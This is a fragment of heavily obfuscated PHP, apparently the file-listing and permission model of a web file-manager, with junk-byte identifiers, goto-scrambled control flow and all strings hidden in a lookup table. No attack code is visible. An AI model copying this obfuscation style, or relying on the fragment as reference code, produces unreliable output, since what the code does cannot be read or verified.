C˜Èï«È®×; BÙâ­šãÍ‰: $f¾…ÊÕçíß =& $_SERVER[›é¼±]; if ($cÆ¿›ßÊğ && !is_array($cÆ¿›ßÊğ)) { $cÆ¿›ßÊğ = array($cÆ¿›ßÊğ); } $BÄ¨«Õ±Ï² = Model($f¾…ÊÕçíß[420])->listData(); goto E‹Ğó¥¬¯–; dÈõÜÕë: } public function listUserRecycle() { $eé¸‘óÂ±Ê =& $_SERVER[›é¼±]; $d¦šÚöòñ = Model($eé¸‘óÂ±Ê[423])->listData(); if (!$d¦šÚöòñ) { return array(); } $dÀÙ±Ÿ’½ = array($eé¸‘óÂ±Ê[412] => array($eé¸‘óÂ±Ê[413], $d¦šÚöòñ), $eé¸‘óÂ±Ê[424] => 1); return $this->listSource($dÀÙ±Ÿ’½); } public function listSource($f¡ÆºöšœÅ, $BÁìßˆ«Á = 3000) { goto b¼É©À¿×¾; BÁÍŠ½¤¯: $C‘¶™èÉ = $this->field($e»¢âÜƒ—)->_makeOrder()->where($f¡ÆºöšœÅ)->selectPage($BÁìßˆ«Á); $this->_listPageCheck($C‘¶™èÉ, $e»¢âÜƒ—, $f¡ÆºöšœÅ); $this->_listDataApply($C‘¶™èÉ[$aöåÙÈÌÄ[367]]); goto Aø¶Òâ¨îØ; b¼É©À¿×¾: $aöåÙÈÌÄ =& $_SERVER[›é¼±]; if (!isset($f¡ÆºöšœÅ[$aöåÙÈÌÄ[425]])) { $f¡ÆºöšœÅ[$aöåÙÈÌÄ[425]] = 0; } $e»¢âÜƒ— = $aöåÙÈÌÄ[426]; goto BÁÍŠ½¤¯; Aø¶Òâ¨îØ: $this->_listMake($C‘¶™èÉ); return $C‘¶™èÉ; goto A ”œéğÂ; A ”œéğÂ: } private function _listPageCheck(&$CáÄˆ¨Š¾Á, $c³í‚Íµ·æ, $f”—Œ™ ¼) { goto BìÕÀïá÷; cÏ‚¿êÔ’: if ($F‚ë¬¾Ö¶’[$F±¾İóï°[366]] <= 1) { return; } if ($F‚ë¬¾Ö¶’[$F±¾İóï°[365]] >= 100000) { return; } if (Model($F±¾İóï°[427])->get($F±¾İóï°[428]) != $F±¾İóï°[429]) { return; } goto C¤–ˆ‡’ñÛ; dĞ–ê‘‹ô: if ($fˆÒ‡Ì–Üê) { $CáÄˆ¨Š¾Á[$F±¾İóï°[367]] = $fˆÒ‡Ì–Üê; } goto eƒ«ÆÙÌŒ‡; FãàŠÜÉ: foreach ($f”—Œ™ ¼ as $Eö™ÍšÆÒà => $eº™‡·—â) { $cñ¢í…œº®[$F±¾İóï°[430] . $Eö™ÍšÆÒà] = $eº™‡·—â; } $this->alias($F±¾İóï°[438])->field($c³í‚Íµ·æ)->limit($eµ¾ªæ†¥‚)->order($cŞŠ»Ô®Ç); $fˆÒ‡Ì–Üê = $this->join($c˜ØôÀ¶É)->where($cñ¢í…œº®)->select(); goto dĞ–ê‘‹ô; EŸòé‘µÈ±: $c˜ØôÀ¶É = $c˜ØôÀ¶É . $F±¾İóï°[434]; $eµ¾ªæ†¥‚ = $F‚ë¬¾Ö¶’[$F±¾İóï°[361]] * ($F‚ë¬¾Ö¶’[$F±¾İóï°[351]] - 1) . $F±¾İóï°[47] . $F‚ë¬¾Ö¶’[$F±¾İóï°[361]]; $b™Â¤¾ß = $this->_makeOrder(!0); goto Aö©ãîƒ¬–; C¤–ˆ‡’ñÛ: $c³í‚Íµ·æ = str_replace(array($F±¾İóï°[50], $F±¾İóï°[340], $F±¾İóï°[229]), $F±¾İóï°[33], $c³í‚Íµ·æ); $c³í‚Íµ·æ = $F±¾İóï°[430] . str_replace($F±¾İóï°[47], $F±¾İóï°[431], $c³í‚Íµ·æ) . $F±¾İóï°[432]; $c˜ØôÀ¶É = $F±¾İóï°[433]; goto EŸòé‘µÈ±; Aö©ãîƒ¬–: $cŞŠ»Ô®Ç = $F±¾İóï°[430] . str_replace($F±¾İóï°[47], $F±¾İóï°[431], $b™Â¤¾ß[0]); if (strpos($cŞŠ»Ô®Ç, $F±¾İóï°[435])) { $cŞŠ»Ô®Ç = str_replace($F±¾İóï°[435], $F±¾İóï°[436], $cŞŠ»Ô®Ç); } else { $cŞŠ»Ô®Ç .= $F±¾İóï°[437] . $b™Â¤¾ß[1]; } $cñ¢í…œº® = array(); goto FãàŠÜÉ; BìÕÀïá÷: $F±¾İóï° =& $_SERVER[›é¼±]; if (!is_array($CáÄˆ¨Š¾Á[$F±¾İóï°[364]])) { return; } $F‚ë¬¾Ö¶’ = $CáÄˆ¨Š¾Á[$F±¾İóï°[364]]; goto cÏ‚¿êÔ’; eƒ«ÆÙÌŒ‡: } protected function _makeOrder($CØÄ¼†¼Õò = false) { goto e¿… óò»; e¿… óò»: $fÚ…¯ô¤”² =& $_SERVER[›é¼±]; $F·¥š—Ø„ = Model($fÚ…¯ô¤”²[439])->get($fÚ…¯ô¤”²[440]); $BÅÁ¸—©Ó† = Model($fÚ…¯ô¤”²[439])->get($fÚ…¯ô¤”²[441]); goto F•â«çÀ§å; AƒÙÒ‹îÒ: if ($CØÄ¼†¼Õò) { return array($añÆ ©ˆ³…, $fÆŠÓ¿ôœ[$eØ¡–ÖêÕš]); } return $this->order($añÆ ©ˆ³…); goto C–ùËĞ¯Ü¾; F•â«çÀ§å: $fÆŠÓ¿ôœ = array($fÚ…¯ô¤”²[442] => $fÚ…¯ô¤”²[443], $fÚ…¯ô¤”²[444] => $fÚ…¯ô¤”²[445]); $e›•«éŞÆš = array($fÚ…¯ô¤”²[28] => $fÚ…¯ô¤”²[28], $fÚ…¯ô¤”²[78] => $fÚ…¯ô¤”²[78], $fÚ…¯ô¤”²[168] => $fÚ…¯ô¤”²[407], $fÚ…¯ô¤”²[446] => $fÚ…¯ô¤”²[446], $fÚ…¯ô¤”²[447] => $fÚ…¯ô¤”²[448], $fÚ…¯ô¤”²[194] => $fÚ…¯ô¤”²[194], $fÚ…¯ô¤”²[84] => $fÚ…¯ô¤”²[84]); $e¸àä‡‚® = Input::get($fÚ…¯ô¤”²[449], $fÚ…¯ô¤”²[7], $F·¥š—Ø„, array_keys($e›•«éŞÆš)); goto EÖ ×‰ˆ; EÖ ×‰ˆ: $eØ¡–ÖêÕš = Input::get($fÚ…¯ô¤”²[450], $fÚ…¯ô¤”²[7], $BÅÁ¸—©Ó†, array_keys($fÆŠÓ¿ôœ)); if (!in_array($e¸àä‡‚®, array_keys($e›•«éŞÆš))) { $e¸àä‡‚® = $fÚ…¯ô¤”²[28]; } if (!in_array($eØ¡–ÖêÕš, array_keys($fÆŠÓ¿ôœ))) { $e¸àä‡‚® = $fÚ…¯ô¤”²[442]; } goto FéÒ£åôÂ; FéÒ£åôÂ: if ($e¸àä‡‚® == $fÚ…¯ô¤”²[28]) { } $añÆ ©ˆ³… = $fÚ…¯ô¤”²[451] . $e›•«éŞÆš[$e¸àä‡‚®] . $fÚ…¯ô¤”²[50] . $fÆŠÓ¿ôœ[$eØ¡–ÖêÕš]; $añÆ ©ˆ³… = rtrim(trim($añÆ ©ˆ³…), $fÚ…¯ô¤”²[47]); goto AƒÙÒ‹îÒ; C–ùËĞ¯Ü¾: } protected function _listDataApplyItem($d˜•ÂÊ‡©, $a“ÄØ©ç‡é = false) { $bĞ­Á÷Õò = array($d˜•ÂÊ‡©); $this->_listDataApply($bĞ­Á÷Õò, $a“ÄØ©ç‡é); return $bĞ­Á÷Õò[0]; } protected function _listDataApply(&$e…©±èìÚ, $eï‘ƒË¾ì = false) { goto dÏ‘ì‚Š; E¶ğŒŞô˜ó: $this->_listAppendUser($e…©±èìÚ); $this->_listFilterInfo($e…©±èìÚ, $eï‘ƒË¾ì); $this->_listAppendAuthSecret($e…©±èìÚ); goto fãïé¢ë¦•; dÏ‘ì‚Š: $EÛ—¬Øî¾ =& $_SERVER[›é¼±]; if (!$e…©±èìÚ) { $e…©±èìÚ = array(); return; } $c‡» ³Ö¸Ì = array_to_keyvalue($e…©±èìÚ, $EÛ—¬Øî¾[33], $EÛ—¬Øî¾[397]); goto B¦¯ÛŠ¿èÜ; AÌ±½¾º‡ã: $this->_listAppendPath($e…©±èìÚ); $this->_listAppendAuth($e…©±èìÚ); $this->_listAppendSourceInfo($e…©±èìÚ, $c‡» ³Ö¸Ì); goto E¶ğŒŞô˜ó; B¦¯ÛŠ¿èÜ: $c‡» ³Ö¸Ì = array_unique($c‡» ³Ö¸Ì); $this->_listSourceCache($e…©±èìÚ); if (!$eï‘ƒË¾ì) { $this->_listAppendMeta($e…©±èìÚ, $c‡» ³Ö¸Ì); $this->_listAppendFileMeta($e…©±èìÚ, $c‡» ³Ö¸Ì); $this->_listAppendChildren($e…©±èìÚ, $c‡» ³Ö¸Ì); } goto AÌ±½¾º‡ã; fãïé¢ë¦•: } protected function _listSourceCache($Fä­›Á°Îæ) { $B•„­ö°ØĞ =& $_SERVER[›é¼±]; foreach ($Fä­›Á°Îæ as $Aá†Ö¹Ş‰Õ) { self::$cacheSourceInfo[$B•„­ö°ØĞ[452] . $Aá†Ö¹Ş‰Õ[$B•„­ö°ØĞ[397]]] = $Aá†Ö¹Ş‰Õ; } } protected function _listFilterInfo(&$c•Šä•…ß, $e“Æ¹Æ¶Èò = false) { $fí·”Ì¨Á =& $_SERVER[›é¼±]; foreach ($c•Šä•…ß as &$a¦‡™Œ’) { $a¦‡™Œ’ = $this->pathInfoFilter($a¦‡™Œ’); self::$cachePathInfo[$fí·”Ì¨Á[453] . intval($e“Æ¹Æ¶Èò) . $fí·”Ì¨Á[454] . $a¦‡™Œ’[$fí·”Ì¨Á[397]]] = $a¦‡™Œ’; } unset($a¦‡™Œ’); } protected function _listMake(&$D¦Ô–†öŸö) { $a±á×«“³› =& $_SERVER[›é¼±]; $D¦Ô–†öŸö[$a±á×«“³›[75]] = array(); $D¦Ô–†öŸö[$a±á×«“³›[74]] = array(); foreach ($D¦Ô–†öŸö[$a±á×«“³›[367]] as $fô¡»œô†ô) { $d÷™¯‹îê¨ = $fô¡»œô†ô[$a±á×«“³›[405]] == 1 ? $a±á×«“³›[75] : $a±á×«“³›[74]; $D¦Ô–†öŸö[$d÷™¯‹îê¨][] = $fô¡»œô†ô; } unset($D¦Ô–†öŸö[$a±á×«“³›[367]]); } protected function _listAppendMeta(&$B–÷Ãì¦ß©, $FÙ»ù¦œ½) { goto EñÊğÂ‘ë; aİ‹İ´¼: foreach ($dìõ°½‡÷µ as $açÏÏ›™Ö) { if (!isset($f›“ãøØ‚[$açÏÏ›™Ö[$CŸ×†­Õ£ï[397]]])) { $f›“ãøØ‚[$açÏÏ›™Ö[$CŸ×†­Õ£ï[397]]] = array(); } if (in_array($açÏÏ›™Ö[$CŸ×†­Õ£ï[93]], $fË«ïÉ­)) { continue; } $f›“ãøØ‚[$açÏÏ›™Ö[$CŸ×†­Õ£ï[397]]][$açÏÏ›™Ö[$CŸ×†­Õ£ï[93]]] = $açÏÏ›™Ö[$CŸ×†­Õ£ï[372]]; } foreach ($B–÷Ãì¦ß© as &$A…®ëÌÃ†) { $A…®ëÌÃ†[$CŸ×†­Õ£ï[459]] = !1; if (isset($f›“ãøØ‚[$A…®ëÌÃ†[$CŸ×†­Õ£ï[397]]])) { $A…®ëÌÃ†[$CŸ×†­Õ£ï[459]] = $f›“ãøØ‚[$A…®ëÌÃ†[$CŸ×†­Õ£ï[397]]]; } if ($this->fileIsLock($A…®ëÌÃ†) && $A…®ëÌÃ†[$CŸ×†­Õ£ï[408]]) { $c ç· ÊŞ¸ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $A…®ëÌÃ†[$CŸ×†­Õ£ï[408]][$CŸ×†­Õ£ï[409]] = AuthModel::authDisable($A…®ëÌÃ†[$CŸ×†­Õ£ï[408]][$CŸ×†­Õ£ï[409]], $c ç· ÊŞ¸); $A…®ëÌÃ†[$CŸ×†­Õ£ï[408]][$CŸ×†­Õ£ï[460]][$CŸ×†­Õ£ï[408]] = $A…®ëÌÃ†[$CŸ×†­Õ£ï[408]][$CŸ×†­Õ£ï[409]]; } } unset($A…®ëÌÃ†); goto bÅÂ¯èË›; EñÊğÂ‘ë: $CŸ×†­Õ£ï =& $_SERVER[›é¼±]; $EÂÈàÚàƒÜ = array($CŸ×†­Õ£ï[412] => array($CŸ×†­Õ£ï[413], $FÙ»ù¦œ½)); $dìõ°½‡÷µ = Model($CŸ×†­Õ£ï[455])->field($CŸ×†­Õ£ï[456])->where($EÂÈàÚàƒÜ)->select(); goto dïÆÀÏ¡æÃ; dïÆÀÏ¡æÃ: if (!$dìõ°½‡÷µ) { return; } $fË«ïÉ­ = array($CŸ×†­Õ£ï[457], $CŸ×†­Õ£ï[458], $CŸ×†­Õ£ï[436]); $f›“ãøØ‚ = array(); goto aİ‹İ´¼; bÅÂ¯èË›: } protected function _listAppendFileMeta(&$bŞ…¯ Ü, $C¹˜ëŸ«ƒ®) { goto F«±ïôã»; d‰•ˆÅóöá: if (!$EğµˆĞù½‘) { return; } $bƒ‹Å»ÙÉ = array($cš¨ ğø‘Ñ[462] => array($cš¨ ğø‘Ñ[413], $EğµˆĞù½‘)); $BÖ´ö–³‹Ò = $cš¨ ğø‘Ñ[463]; goto eÜŸ³‹„·Ç; dê­­Œâ¢§: foreach ($bŞ…¯ Ü as &$eÂ­×Öµ£) { goto D–„á·õ; D–„á·õ: $DéÚ–ÛØÍ = $eÂ­×Öµ£[$cš¨ ğø‘Ñ[461]]; if (!$DéÚ–ÛØÍ || !is_array($E¸ğ°Ç‚‚÷[$DéÚ–ÛØÍ])) { continue; } $dÌÔ¯„‘Ô = $E¸ğ°Ç‚‚÷[$DéÚ–ÛØÍ]; goto aí«Ö«¹ŒÕ; aí«Ö«¹ŒÕ: $dÌÔ¯„‘Ô[$cš¨ ğø‘Ñ[78]] = $eÂ­×Öµ£[$cš¨ ğø‘Ñ[78]]; $dÌÔ¯„‘Ô[$cš¨ ğø‘Ñ[28]] = $eÂ­×Öµ£[$cš¨ ğø‘Ñ[28]]; if (!isset(self::$cacheFileInfo[$cš¨ ğø‘Ñ[467] . $DéÚ–ÛØÍ])) { self::$cacheFileInfo[$cš¨ ğø‘Ñ[467] . $DéÚ–ÛØÍ] = array_merge(array(), $dÌÔ¯„‘Ô); } goto Cï—ˆŒçÀã; Cï—ˆŒçÀã: unset($E¸ğ°Ç‚‚÷[$DéÚ–ÛØÍ][$cš¨ ğø‘Ñ[76]]); $eõÕ„Õ­Ø¨ = is_array($f­§±â„Ø¨[$DéÚ–ÛØÍ]) ? $f­§±â„Ø¨[$DéÚ–ÛØÍ] : array(); $eÂ­×Öµ£[$cš¨ ğø‘Ñ[164]] = array_merge($eõÕ„Õ­Ø¨, $E¸ğ°Ç‚‚÷[$DéÚ–ÛØÍ]); goto bÄ¸š³ãœÛ; bÄ¸š³ãœÛ: if (isset($eÂ­×Öµ£[$cš¨ ğø‘Ñ[164]][$cš¨ ğø‘Ñ[163]])) { $eÂ­×Öµ£[$cš¨ ğø‘Ñ[163]] = json_decode($eÂ­×Öµ£[$cš¨ ğø‘Ñ[164]][$cš¨ ğø‘Ñ[163]], !0); unset($eÂ­×Öµ£[$cš¨ ğø‘Ñ[164]][$cš¨ ğø‘Ñ[163]]); } goto fÂƒì¿˜»Æ; fÂƒì¿˜»Æ: } unset($eÂ­×Öµ£); goto a—„¡¸Œ¹; C¯‰‘Ùá: $Bó‹±ºÑÓŠ = $Bó‹±ºÑÓŠ ? $Bó‹±ºÑÓŠ : array(); $f­§±â„Ø¨ = array(); foreach ($Bó‹±ºÑÓŠ as $e»¢ÖØÎ³•) { if (!isset($f­§±â„Ø¨[$e»¢ÖØÎ³•[$cš¨ ğø‘Ñ[461]]])) { $f­§±â„Ø¨[$e»¢ÖØÎ³•[$cš¨ ğø‘Ñ[461]]] = array(); } $f­§±â„Ø¨[$e»¢ÖØÎ³•[$cš¨ ğø‘Ñ[461]]][$e»¢ÖØÎ³•[$cš¨ ğø‘Ñ[93]]] = $e»¢ÖØÎ³•[$cš¨ ğø‘Ñ[372]]; } goto dê­­Œâ¢§; F«±ïôã»: $cš¨ ğø‘Ñ =& $_SERVER[›é¼±]; $EğµˆĞù½‘ = array_to_keyvalue($bŞ…¯ Ü, $cš¨ ğø‘Ñ[33], $cš¨ ğø‘Ñ[461]); $EğµˆĞù½‘ = array_filter(array_unique($EğµˆĞù½‘)); goto d‰•ˆÅóöá; eÜŸ³‹„·Ç: $E¸ğ°Ç‚‚÷ = Model($cš¨ ğø‘Ñ[464])->field($BÖ´ö–³‹Ò)->where($bƒ‹Å»ÙÉ)->select(); $E¸ğ°Ç‚‚÷ = array_to_keyvalue($E¸ğ°Ç‚‚÷, $cš¨ ğø‘Ñ[461]); $Bó‹±ºÑÓŠ = Model($cš¨ ğø‘Ñ[465])->field($cš¨ ğø‘Ñ[466])->where($bƒ‹Å»ÙÉ)->select(); goto C¯‰‘Ùá; a—„¡¸Œ¹: } protected function _listAppendSourceInfo(&$AÙ¶¬Ü·„¯, $B¹ÁéƒëÕ) { goto dÔÇàç¤‰ê; b…ÌÏÆÑ“‹: $eŒÆÎØ“ö = array_to_keyvalue_group($B“ĞÊª¨°“, $cÍ˜ŠÎ¦ß[397]); foreach ($AÙ¶¬Ü·„¯ as &$b´Ö³˜šè) { $b´Ö³˜šè[$cÍ˜ŠÎ¦ß[85]] = array($cÍ˜ŠÎ¦ß[471] => 0, $cÍ˜ŠÎ¦ß[472] => 0, $cÍ˜ŠÎ¦ß[473] => 0); if (isset($B¶Ê²‡–÷ˆ[$b´Ö³˜šè[$cÍ˜ŠÎ¦ß[397]]])) { $b´Ö³˜šè[$cÍ˜ŠÎ¦ß[85]][$cÍ˜ŠÎ¦ß[474]] = 1; $b´Ö³˜šè[$cÍ˜ŠÎ¦ß[85]][$cÍ˜ŠÎ¦ß[475]] = $B¶Ê²‡–÷ˆ[$b´Ö³˜šè[$cÍ˜ŠÎ¦ß[397]]][$cÍ˜ŠÎ¦ß[28]]; } if (isset($bØã¡àİš©[$b´Ö³˜šè[$cÍ˜ŠÎ¦ß[397]]])) { $b´Ö³˜šè[$cÍ˜ŠÎ¦ß[85]][$cÍ˜ŠÎ¦ß[476]] = array(); foreach ($bØã¡àİš©[$b´Ö³˜šè[$cÍ˜ŠÎ¦ß[397]]] as $C¸«ò¾ŸØ) { $EÜå°³”° = $e‰Ó’Ôğ”‘[$C¸«ò¾ŸØ]; $b´Ö³˜šè[$cÍ˜ŠÎ¦ß[85]][$cÍ˜ŠÎ¦ß[476]][] = array($cÍ˜ŠÎ¦ß[477] => $EÜå°³”°[$cÍ˜ŠÎ¦ß[395]], $cÍ˜ŠÎ¦ß[415] => $EÜå°³”°[$cÍ˜ŠÎ¦ß[28]], $cÍ˜ŠÎ¦ß[478] => $EÜå°³”°[$cÍ˜ŠÎ¦ß[479]]); } } if (isset($eŒÆÎØ“ö[$b´Ö³˜šè[$cÍ˜ŠÎ¦ß[397]]])) { $b´Ö³˜šè[$cÍ˜ŠÎ¦ß[85]][$cÍ˜ŠÎ¦ß[480]] = array(); foreach ($eŒÆÎØ“ö[$b´Ö³˜šè[$cÍ˜ŠÎ¦ß[397]]] as $FÊá„³­×æ) { $b´Ö³˜šè[$cÍ˜ŠÎ¦ß[85]][$cÍ˜ŠÎ¦ß[480]] = array($cÍ˜ŠÎ¦ß[481] => $FÊá„³­×æ[$cÍ˜ŠÎ¦ß[482]], $cÍ˜ŠÎ¦ß[483] => $FÊá„³­×æ[$cÍ˜ŠÎ¦ß[484]], $cÍ˜ŠÎ¦ß[485] => $FÊá„³­×æ[$cÍ˜ŠÎ¦ß[397]], $cÍ˜ŠÎ¦ß[486] => $FÊá„³­×æ[$cÍ˜ŠÎ¦ß[487]], $cÍ˜ŠÎ¦ß[488] => $FÊá„³­×æ[$cÍ˜ŠÎ¦ß[489]], $cÍ˜ŠÎ¦ß[490] => $FÊá„³­×æ[$cÍ˜ŠÎ¦ß[490]], $cÍ˜ŠÎ¦ß[491] => $FÊá„³­×æ[$cÍ˜ŠÎ¦ß[491]]); } } } unset($b´Ö³˜šè); goto C•áÓ÷ˆ§°; C’ù¬ß†Í÷: $a ÅĞÚ²©¶ = Model($cÍ˜ŠÎ¦ß[420])->listData(); $C”×óå¬­Õ = Model($cÍ˜ŠÎ¦ß[410])->listData(); $B“ĞÊª¨°“ = Model($cÍ˜ŠÎ¦ß[470])->listSimple(); goto A¯ğ—ñçñî; C•áÓ÷ˆ§°: return $AÙ¶¬Ü·„¯; goto bŠšº¸äƒ¡; dÔÇàç¤‰ê: $cÍ˜ŠÎ¦ß =& $_SERVER[›é¼±]; if (!defined($cÍ˜ŠÎ¦ß[468])) { return; } $b«ŠÆîó» = Model($cÍ˜ŠÎ¦ß[469])->listData(); goto C’ù¬ß†Í÷; A¯ğ—ñçñî: $e‰Ó’Ôğ”‘ = array_to_keyvalue($b«ŠÆîó», $cÍ˜ŠÎ¦ß[395]); $bØã¡àİš© = array_to_keyvalue_group($a ÅĞÚ²©¶, $cÍ˜ŠÎ¦ß[76], $cÍ˜ŠÎ¦ß[421]); $B¶Ê²‡–÷ˆ = array_to_keyvalue($C”×óå¬­Õ, $cÍ˜ŠÎ¦ß[76]); goto b…ÌÏÆÑ“‹; bŠšº¸äƒ¡: } protected function _listAppendChildren(&$fèÆª®é´À, $c¾ÀÛÕ§Ùö) { goto bÈ¡İéåÑ›; eÏÁÅ³ò¡§: $d™¹ÉÅ»Ü• = array(); foreach ($D‹˜¯‹É–Ó as $F„ˆ çĞñ) { $c¿¼ìÖ‡ù‘ = $F„ˆ çĞñ[$dÄ†‡ªÏæ‰[492]]; $Fµ–ÉàÁÈÒ = $F„ˆ çĞñ[$dÄ†‡ªÏæ‰[405]] == $dÄ†‡ªÏæ‰[87] ? $dÄ†‡ªÏæ‰[204] : $dÄ†‡ªÏæ‰[203]; if (!isset($d™¹ÉÅ»Ü•[$c¿¼ìÖ‡ù‘])) { $d™¹ÉÅ»Ü•[$c¿¼ìÖ‡ù‘] = array($dÄ†‡ªÏæ‰[203] => 0, $dÄ†‡ªÏæ‰[204] => 0); } $d™¹ÉÅ»Ü•[$c¿¼ìÖ‡ù‘][$Fµ–ÉàÁÈÒ] += $F„ˆ çĞñ[$dÄ†‡ªÏæ‰[494]]; } foreach ($fèÆª®é´À as &$bŞê‰Ÿ×ç×) { if (!$bŞê‰Ÿ×ç×[$dÄ†‡ªÏæ‰[405]]) { continue; } $EÀô¶ÃÉ‡ = is_array($d™¹ÉÅ»Ü•[$bŞê‰Ÿ×ç×[$dÄ†‡ªÏæ‰[397]]]) ? $d™¹ÉÅ»Ü•[$bŞê‰Ÿ×ç×[$dÄ†‡ªÏæ‰[397]]] : $D•ÕÕìİÃ; $bŞê‰Ÿ×ç×[$dÄ†‡ªÏæ‰[204]] = $EÀô¶ÃÉ‡[$dÄ†‡ªÏæ‰[204]]; $bŞê‰Ÿ×ç×[$dÄ†‡ªÏæ‰[203]] = $EÀô¶ÃÉ‡[$dÄ†‡ªÏæ‰[203]]; unset($bŞê‰Ÿ×ç×[$dÄ†‡ªÏæ‰[407]]); } goto e×•ÅÔ¤–; e×•ÅÔ¤–: unset($bŞê‰Ÿ×ç×); goto Aˆøôø•¢; bÈ¡İéåÑ›: $dÄ†‡ªÏæ‰ =& $_SERVER[›é¼±]; $Cğ–ôÈ‡³ = array(); $D•ÕÕìİÃ = array($dÄ†‡ªÏæ‰[203] => 0, $dÄ†‡ªÏæ‰[204] => 0); goto C°ºğÄ¦‡¿; C°ºğÄ¦‡¿: foreach ($fèÆª®é´À as &$bŞê‰Ÿ×ç×) { if (!$bŞê‰Ÿ×ç×[$dÄ†‡ªÏæ‰[405]]) { continue; } $Cğ–ôÈ‡³[] = $bŞê‰Ÿ×ç×[$dÄ†‡ªÏæ‰[397]]; } unset($bŞê‰Ÿ×ç×); if (!$Cğ–ôÈ‡³) { return; } goto Eëø°¸ô†; Eëø°¸ô†: $d¶Ë­Ş™ = array($dÄ†‡ªÏæ‰[492] => array($dÄ†‡ªÏæ‰[7], $Cğ–ôÈ‡³)); $b–¨Õ„ŒÁó = array($dÄ†‡ªÏæ‰[492], $dÄ†‡ªÏæ‰[405], $dÄ†‡ªÏæ‰[493] => $dÄ†‡ªÏæ‰[494]); $D‹˜¯‹É–Ó = $this->field($b–¨Õ„ŒÁó)->where($d¶Ë­Ş™)->group($dÄ†‡ªÏæ‰[495])->select(); goto eÏÁÅ³ò¡§; Aˆøôø•¢: } protected function _listAppendAuth(&$b¿Ö•Š‰àÏ) { goto B÷—ê ’àÌ; fÔëğšŸ: foreach ($b¿Ö•Š‰àÏ as $DÄø‡£¹Ó) { if ($DÄø‡£¹Ó[$e²«ÕÌ¿Åê[406]] == self::TYPE_GROUP) { $Dõì®’ÜÌ[] = $DÄø‡£¹Ó[$e²«ÕÌ¿Åê[397]]; } } if (!$Dõì®’ÜÌ) { return; } $Bâ¯¯ğÒÓ˜ = array_to_keyvalue($b¿Ö•Š‰àÏ, $e²«ÕÌ¿Åê[397]); goto eËùÆ×ÆËÒ; B÷—ê ’àÌ: $e²«ÕÌ¿Åê =& $_SERVER[›é¼±]; if (!defined($e²«ÕÌ¿Åê[468])) { return; } $Dõì®’ÜÌ = array(); goto fÔëğšŸ; eËùÆ×ÆËÒ: $c¨ƒƒ·–ÛŸ = Model($e²«ÕÌ¿Åê[496])->getSourceList($Dõì®’ÜÌ, $Bâ¯¯ğÒÓ˜); foreach ($b¿Ö•Š‰àÏ as $fÎ…Ï­šœ­ => &$DÄø‡£¹Ó) { $DÄø‡£¹Ó[$e²«ÕÌ¿Åê[408]] = $c¨ƒƒ·–ÛŸ[$DÄø‡£¹Ó[$e²«ÕÌ¿Åê[397]]]; if (!$DÄø‡£¹Ó[$e²«ÕÌ¿Åê[408]] && $DÄø‡£¹Ó[$e²«ÕÌ¿Åê[406]] == self::TYPE_GROUP) { $DÄø‡£¹Ó[$e²«ÕÌ¿Åê[408]] = Action($e²«ÕÌ¿Åê[497])->pathGroupAuthMake($DÄø‡£¹Ó[$e²«ÕÌ¿Åê[498]]); if (!$DÄø‡£¹Ó[$e²«ÕÌ¿Åê[408]] && !_get($GLOBALS, $e²«ÕÌ¿Åê[499])) { $DÄø‡£¹Ó[$e²«ÕÌ¿Åê[196]] = !1; $DÄø‡£¹Ó[$e²«ÕÌ¿Åê[195]] = !1; } } if ($DÄø‡£¹Ó[$e²«ÕÌ¿Åê[408]]) { $DÄø‡£¹Ó[$e²«ÕÌ¿Åê[196]] = AuthModel::authCheckEdit($DÄø‡£¹Ó[$e²«ÕÌ¿Åê[408]][$e²«ÕÌ¿Åê[409]]); $DÄø‡£¹Ó[$e²«ÕÌ¿Åê[195]] = AuthModel::authCheckView($DÄø‡£¹Ó[$e²«ÕÌ¿Åê[408]][$e²«ÕÌ¿Åê[409]]); } $this->groupPathDisplay($DÄø‡£¹Ó); } unset($DÄø‡£¹Ó); goto eåïàŸ; eåïàŸ: } public function _listAppendAuthSecret(&$Cİè¯ÑŠì·) { goto bª‡¸¸Ü¥; E´¼µìËë: if (!$A¿”—–¹Ó¿) { goto C’°¶‚ÀÅ…; f£™â—Íä: foreach ($A¿”—–¹Ó¿ as $Fäôâ¹™öî => $EÈ°¤İñ) { goto CÏïäç¬ï‰; c÷”’İÖÓ¾: $EÈ°¤İñ[$BÎ×õÓ˜­‘[506]] = Model($BÎ×õÓ˜­‘[507])->getInfoSimpleOuter($EÈ°¤İñ[$BÎ×õÓ˜­‘[446]]); $A¿”—–¹Ó¿[$Fäôâ¹™öî] = $EÈ°¤İñ; goto aà™•Á„¯ø; CÏïäç¬ï‰: $däéÕ¤ñÁÅ = $EšãœÕø¦ï[$EÈ°¤İñ[$BÎ×õÓ˜­‘[504]]]; if (!$däéÕ¤ñÁÅ) { $FİÛ±öãÑ->remove($EÈ°¤İñ[$BÎ×õÓ˜­‘[395]]); unset($A¿”—–¹Ó¿[$Fäôâ¹™öî]); continue; } $c‰†ƒ¡Š©± = $BÚ‹à®œï->listData($däéÕ¤ñÁÅ[$BÎ×õÓ˜­‘[408]]); goto E¢îäìëñ„; E¢îäìëñ„: if (!$c‰†ƒ¡Š©±) { $FİÛ±öãÑ->remove($EÈ°¤İñ[$BÎ×õÓ˜­‘[395]]); unset($A¿”—–¹Ó¿[$Fäôâ¹™öî]); continue; } $EÈ°¤İñ[$BÎ×õÓ˜­‘[408]] = $c‰†ƒ¡Š©±; $EÈ°¤İñ[$BÎ×õÓ˜­‘[505]] = $däéÕ¤ñÁÅ; goto c÷”’İÖÓ¾; aà™•Á„¯ø: } goto Côï“ãœ¹‘; Bµ‹Á‰ïš: $A¿”—–¹Ó¿ = array_to_keyvalue($A¿”—–¹Ó¿, $BÎ×õÓ˜­‘[397]); $EšãœÕø¦ï = json_decode(Model($BÎ×õÓ˜­‘[427])->get($BÎ×õÓ˜­‘[503]), !0); $EšãœÕø¦ï = array_to_keyvalue($EšãœÕø¦ï, $BÎ×õÓ˜­‘[395]); goto f£™â—Íä; C’°¶‚ÀÅ…: $BÚ‹à®œï = Model($BÎ×õÓ˜­‘[501]); $FİÛ±öãÑ = Model($BÎ×õÓ˜­‘[502]); $A¿”—–¹Ó¿ = $FİÛ±öãÑ->listData(); goto Bµ‹Á‰ïš; Côï“ãœ¹‘: } $dØä•Å°Ÿå = defined($BÎ×õÓ˜­‘[508]) ? USER_ID : $BÎ×õÓ˜­‘[33]; $aª¶˜Õ“á¯ = array(); goto Cêö¨æ°¾É; bª‡¸¸Ü¥: $BÎ×õÓ˜­‘ =& $_SERVER[›é¼±]; if (Model($BÎ×õÓ˜­‘[427])->get($BÎ×õÓ˜­‘[500]) != $BÎ×õÓ˜­‘[87]) { return; } static $A¿”—–¹Ó¿ = false; goto 